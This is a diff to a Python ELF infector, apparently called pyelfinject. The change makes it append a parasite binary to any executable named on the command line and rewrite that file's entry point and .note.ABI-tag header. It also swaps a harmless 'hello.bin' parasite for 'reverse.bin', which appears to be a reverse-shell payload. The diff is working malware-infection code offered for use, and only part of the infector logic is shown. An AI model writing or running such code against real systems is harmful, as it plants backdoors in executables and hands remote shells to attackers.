@@ -1,5 +1,6 @@
 import os
 import struct
+import sys
 
 E_ENTRY_OFFSET = 0x18
 E_SHENTSIZE_OFFSET = 0x3A
@@ -23,8 +24,7 @@ PT_FLAGS_OFFSET = 0x04
 PT_MEMSZ_OFFSET = 0x28
 PT_ALIGN_OFFSET = 0x30
 
-PARASITE_BINARY = "hello.bin"
-HOST_BINARY = "hello"
+PARASITE_BINARY = "reverse.bin"
 
 def align(addr, injected_addr):
     n = (injected_addr % 4096) - (addr % 4096)
@@ -39,10 +39,10 @@ def write_at_addr(fd, addr, data):
     fd.seek(addr)
     fd.write(data)
 
-def inject():
+def inject(host_binary):
     fd = open(PARASITE_BINARY, "rb")
     content = fd.read()
-    with open(HOST_BINARY, "ab") as binary:
+    with open(host_binary, "ab") as binary:
         injected_addr = binary.tell()
         binary.write(content)
 
@@ -122,9 +122,15 @@ def infect_entry_point(fd, injected_addr):
 
 
 def main():
-    fd = open(HOST_BINARY, "rb+")
+    if len(sys.argv) != 2:
+        print("Usage: pyelfinject <binary>")
+        return
+        
+    host_binary = sys.argv[1]
+
+    fd = open(host_binary, "rb+")
     # Append the bytes to the end of the target binary
-    injected_addr = inject()
+    injected_addr = inject(host_binary)
     print("Code injected at addr:", hex(injected_addr))
 
     # Infect .note.ABI-tag section header
